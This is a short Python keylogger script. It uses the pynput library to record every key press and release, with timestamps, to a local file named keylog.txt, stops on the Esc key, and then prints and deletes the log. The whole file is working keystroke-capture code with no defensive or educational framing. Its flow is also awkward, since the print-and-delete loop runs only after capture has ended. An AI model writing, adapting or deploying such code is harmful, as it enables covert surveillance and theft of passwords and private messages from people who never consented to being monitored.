import logging
import os
import sys
import time
from typing import Optional, Union

from pynput.keyboard import Key, KeyCode, Listener

log_file: str = "keylog.txt"

logging.basicConfig(
    filename=log_file, level=logging.DEBUG, format="%(asctime)s: %(message)s"
)


def on_press(key: Optional[Union[KeyCode, Key]]) -> None:
    try:
        if isinstance(key, KeyCode):
            logging.info("Key %s pressed.", key.char)
        else:
            logging.info("Special key %s pressed.", key)
    except AttributeError:
        logging.info("Special key %s pressed.", key)


def on_release(key: Union[Key, KeyCode, None]) -> None:
    logging.info("Key %s released.", key)
    if key == Key.esc:
        raise KeyboardInterrupt


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


while True:
    try:
        time.sleep(5)
        if os.path.exists(log_file):
            with open(log_file, "r", encoding="utf-8") as f:
                print(f.read())
            os.remove(log_file)
    except KeyboardInterrupt:
        sys.exit(0)
